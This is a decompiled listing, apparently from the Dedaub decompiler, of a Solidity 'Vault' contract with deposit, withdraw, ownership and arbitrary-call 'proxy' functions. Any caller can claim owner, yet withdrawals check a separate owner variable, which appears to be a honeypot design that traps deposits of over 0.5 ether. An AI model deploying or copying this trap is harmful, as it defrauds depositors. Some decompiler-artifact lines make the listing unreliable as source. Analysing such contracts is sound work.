// Decompiled by library.dedaub.com
// 2023.11.08 22:00 UTC
// Compiled using the solidity compiler version 0.4.7<=v<0.5.9


// Data structures and variables inferred from the use of storage instructions
mapping (uint256 => uint256) _deposit; // STORAGE[0x2]
uint256 _transferOwner; // STORAGE[0x0] bytes 0 to 19
uint256 _owner; // STORAGE[0x1] bytes 0 to 19



function transferOwner(address varg0) public nonPayable { 
    if (msg.sender == _transferOwner) {
        _transferOwner = varg0;
    }
}

function Owner() public nonPayable { 
    return _owner;
}

function proxy(address varg0, bytes varg1) public payable { 
    v0 = new bytes[](varg1.length);
    CALLDATACOPY(v0.data, varg1.data, varg1.length);
    v1 = v2 = 0;
    while (v1 < v0.length) {
        MEM[v3.data + v1] = v0[v1];
        v1 = v1 + 32;
    }
    v4 = v5 = v0.length + v3.data;
    if (0x1f & v0.length) {
        MEM[v5 - (0x1f & v0.length)] = ~(256 ** (32 - (0x1f & v0.length)) - 1) & MEM[v5 - (0x1f & v0.length)];
    }
    v6 = varg0.call(v3.data).value(msg.value).gas(msg.gas);
}

function deposit() public payable { 
    if (msg.value > 0x6f05b59d3b20000) {
        _deposit[msg.sender] = _deposit[msg.sender] + msg.value;
    }
}

function () public payable { 
}

function Vault() public payable { 
    if (msg.sender == address(tx.origin)) {
        _owner = msg.sender;
        if (msg.value > 0x6f05b59d3b20000) {
            _deposit[msg.sender] = _deposit[msg.sender] + msg.value;
        }
    }
}

function withdraw(uint256 varg0) public nonPayable { 
    if (msg.sender == _transferOwner) {
        v0 = v1 = varg0 > 0;
        if (v1) {
            v0 = _deposit[msg.sender] >= varg0;
        }
        if (v0) {
            v2 = msg.sender.call().value(varg0).gas(!varg0 * 2300);
            require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
        }
    }
}

function Deposits(address varg0) public nonPayable { 
    return _deposit[varg0];
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__(bytes4 function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length >= 4) {
        if (0x2d2c44f2 == uint32(function_selector >> 224)) {
            Vault();
        } else if (0x2e1a7d4d == uint32(function_selector >> 224)) {
            withdraw(uint256);
        } else if (0x3ee2d7c2 == uint32(function_selector >> 224)) {
            Deposits(address);
        } else if (0x4fb2e45d == uint32(function_selector >> 224)) {
            transferOwner(address);
        } else if (0xb4a99a4e == uint32(function_selector >> 224)) {
            Owner();
        } else if (0xbe6d055a == uint32(function_selector >> 224)) {
            proxy(address,bytes);
        } else if (0xd0e30db0 == uint32(function_selector >> 224)) {
            deposit();
        }
    }
    ();
}
